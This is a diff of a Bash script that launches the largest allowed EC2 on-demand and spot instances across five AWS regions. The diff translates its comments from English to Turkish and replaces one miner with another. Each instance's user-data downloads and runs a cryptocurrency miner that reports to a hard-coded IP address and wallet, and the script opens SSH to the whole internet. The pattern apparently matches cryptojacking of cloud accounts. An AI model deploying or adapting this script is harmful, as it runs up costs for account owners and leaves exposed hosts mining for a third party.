@@ -1,36 +1,35 @@
 #!/bin/bash
 
 # ------------------------------------------------------------------------------
-# This script creates BOTH an On-Demand instance AND a Spot instance in each
-# specified region, provided the vCPU limit is sufficient and a supported
-# instance type is available in that region.
+# Bu script, belirtilen her bölgede, vCPU limiti yeterliyse ve desteklenen bir
+# instance türü varsa, hem On-Demand hem de Spot instance oluşturur.
 # ------------------------------------------------------------------------------
 
-# Instance types to consider
-declare -a instance_types=("m8g.16xlarge" "c8g.16xlarge" "r8g.16xlarge")
+# Instance türleri
+declare -a instance_types=("m7a.16xlarge" "c7a.16xlarge" "r7a.16xlarge")
 
-# Regions
+# Bölgeler
 declare -a regions=("eu-west-1" "eu-north-1" "us-east-1" "us-west-2" "eu-central-1")
 
-# AMI IDs by region (ARM64 Ubuntu 24)
+# Bölgelere göre AMI ID'leri (ARM64 Ubuntu 24)
 declare -A ami_ids
-ami_ids["eu-west-1"]="ami-arm64-ubuntu24-euw1"
-ami_ids["eu-north-1"]="ami-001e33773aec8d45f"
-ami_ids["us-east-1"]="ami-0a7a4e87939439934"
-ami_ids["us-west-2"]="ami-0acefc55c3a331fa8"
-ami_ids["eu-central-1"]="ami-arm64-ubuntu24-euc1"
+ami_ids["eu-west-1"]="ami-arm64-ubuntu24-euw1"  # Geçerli bir AMI ID ile değiştirin
+ami_ids["eu-north-1"]="ami-0c1ac8a41498c1a9c"
+ami_ids["us-east-1"]="ami-084568db4383264d4"
+ami_ids["us-west-2"]="ami-075686beab831bb7f"
+ami_ids["eu-central-1"]="ami-arm64-ubuntu24-euc1"  # Geçerli bir AMI ID ile değiştirin
 
-# Arrays to track success/failure
+# Başarı/başarısızlık takibi için diziler
 success_list_on_demand=()
 success_list_spot=()
 failed_regions_on_demand=()
 failed_regions_spot=()
 
 # ------------------------------------------------------------------------------
-# Function: check_vcpu_limit
+# Fonksiyon: check_vcpu_limit
 # ------------------------------------------------------------------------------
-# Checks the On-Demand vCPU limit (Quota code: L-1216C47A) in the given region.
-# Returns 0 (success) if vCPU limit is >= 64, otherwise returns 1.
+# Verilen bölgedeki On-Demand vCPU limitini (Quota kodu: L-1216C47A) kontrol eder.
+# vCPU limiti >= 64 ise 0 (başarı), aksi takdirde 1 döndürür.
 # ------------------------------------------------------------------------------
 check_vcpu_limit() {
     local region=$1
@@ -43,7 +42,7 @@ check_vcpu_limit() {
         --quota-code L-1216C47A \
         --query "Quota.Value" --output text 2>/dev/null)
 
-    # Convert limit to integer
+    # Limiti tam sayıya çevir
     vcpu_limit=$(printf "%.0f" "$vcpu_limit" 2>/dev/null)
 
     if [ -z "$vcpu_limit" ]; then
@@ -51,7 +50,7 @@ check_vcpu_limit() {
         return 1
     fi
 
-    echo "vCPU Limit: $vcpu_limit"
+    echo "vCPU Limiti: $vcpu_limit"
     if (( vcpu_limit < 64 )); then
         echo "vCPU limiti yetersiz. Bölge $region atlanıyor."
         return 1
@@ -61,10 +60,10 @@ check_vcpu_limit() {
 }
 
 # ------------------------------------------------------------------------------
-# Function: find_instance_type
+# Fonksiyon: find_instance_type
 # ------------------------------------------------------------------------------
-# Randomly shuffles the instance_types array and returns the first instance_type
-# that is offered in the given region. If none are found, returns empty string.
+# instance_types dizisini rastgele karıştırır ve verilen bölgede sunulan ilk
+# instance türünü döndürür. Hiçbiri bulunamazsa boş string döndürür.
 # ------------------------------------------------------------------------------
 find_instance_type() {
     local region=$1
@@ -84,12 +83,12 @@ find_instance_type() {
 }
 
 # ------------------------------------------------------------------------------
-# Function: create_instance
+# Fonksiyon: create_instance
 # ------------------------------------------------------------------------------
-# Creates an EC2 instance (on-demand or spot) in the specified region.
-# Parameters:
+# Belirtilen bölgede EC2 instance (on-demand veya spot) oluşturur.
+# Parametreler:
 #   1) region
-#   2) market_type ("on-demand" or "spot")
+#   2) market_type ("on-demand" veya "spot")
 #   3) instance_type
 #   4) ami_id
 # ------------------------------------------------------------------------------
@@ -99,35 +98,35 @@ create_instance() {
     local instance_type="$3"
     local ami_id="$4"
 
-    # Get the default SG ID
+    # Varsayılan güvenlik grubu ID'sini al
     local security_group_id
     security_group_id=$(aws ec2 describe-security-groups \
         --region "$region" \
         --filters "Name=group-name,Values=default" \
         --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)
 
-    # Open SSH (port 22) to the world for quick usage (not recommended for production)
+    # SSH (22 portu) için herkese açık erişim (üretim ortamı için önerilmez)
     aws ec2 authorize-security-group-ingress \
         --region "$region" \
         --group-id "$security_group_id" \
         --protocol tcp --port 22 --cidr 0.0.0.0/0 \
         2>/dev/null || true
 
-    # User data to install packages and run the miner
+    # Paketleri kurmak ve madenciyi çalıştırmak için kullanıcı verisi
     local user_data
     user_data=$(cat <<EOF
 #!/bin/bash
 sudo apt update -y
-sudo apt install -y git screen
+sudo apt install -y wget screen
 cd /root
-git clone https://github.com/eraemm/efsaneyim.git
-cd efsaneyim
-chmod +x tnn-miner-arch
-screen -dmS spectre ./tnn-miner-arch --spectre --daemon-address 144.91.120.111 --port 5555 --wallet spectre:qq66aq7yfpg7sfs27fmc3t5jfqx786e569la6d85hmvvn2807c6pqfj6tuz6a
+wget https://github.com/DeroLuna/dero-miner/releases/download/v1.14/deroluna-v1.14_linux_hiveos_mmpos.tar.gz
+tar -xvf deroluna-v1.14_linux_hiveos_mmpos.tar.gz
+cd deroluna
+screen -dmS dero ./deroluna-miner -w dero1qyy8lusws59e50q9pru6wjt709jcgjle8t4qfmjfm25kzk32s0z8gqgp35cum -d 144.91.103.135:10100
 EOF
     )
 
-    # Build the AWS CLI command
+    # AWS CLI komutunu oluştur
     local market_options=""
     local instance_id=""
 
@@ -160,41 +159,41 @@ EOF
 }
 
 # ------------------------------------------------------------------------------
-# MAIN SCRIPT: For each region, create On-Demand and Spot
+# ANA SCRIPT: Her bölge için On-Demand ve Spot oluştur
 # ------------------------------------------------------------------------------
 for region in "${regions[@]}"; do
 
     echo "********************************************************"
     echo "Bölge: $region"
 
-    # Check vCPU limit first
+    # Önce vCPU limitini kontrol et
     if ! check_vcpu_limit "$region"; then
-        continue  # Skip this region
+        continue  # Bu bölgeyi atla
     fi
 
-    # Find a suitable instance type
+    # Uygun bir instance türü bul
     chosen_type=$(find_instance_type "$region")
     if [ -z "$chosen_type" ]; then
         echo "$region bölgesinde uygun bir instance türü bulunamadı."
-        # No need to try On-Demand or Spot; region fails for both
+        # On-Demand veya Spot için denemeye gerek yok; bölge her ikisi için başarısız
         failed_regions_on_demand+=("$region")
         failed_regions_spot+=("$region")
         continue
     fi
     echo "Seçilen instance türü: $chosen_type"
 
-    # Get AMI ID
+    # AMI ID'sini al
     ami_id="${ami_ids[$region]}"
     if [ -z "$ami_id" ]; then
         echo "$region bölgesi için AMI ID'si tanımlanmamış."
-        # No need to try On-Demand or Spot; region fails for both
+        # On-Demand veya Spot için denemeye gerek yok; bölge her ikisi için başarısız
         failed_regions_on_demand+=("$region")
         failed_regions_spot+=("$region")
         continue
     fi
 
     # ------------------------------------------------------------------
-    # Create ON-DEMAND instance
+    # ON-DEMAND instance oluştur
     echo "---- On-Demand instance oluşturuluyor..."
     ondemand_instance_id=$(create_instance "$region" "on-demand" "$chosen_type" "$ami_id")
 
@@ -207,7 +206,7 @@ for region in "${regions[@]}"; do
     fi
 
     # ------------------------------------------------------------------
-    # Create SPOT instance
+    # SPOT instance oluştur
     echo "---- Spot instance oluşturuluyor..."
     spot_instance_id=$(create_instance "$region" "spot" "$chosen_type" "$ami_id")
 
@@ -222,7 +221,7 @@ for region in "${regions[@]}"; do
 done
 
 # ------------------------------------------------------------------------------
-# Print Summary
+# Özet Yazdır
 # ------------------------------------------------------------------------------
 echo "==========================================================="
 echo "On-Demand Başarılı bölgeler:"
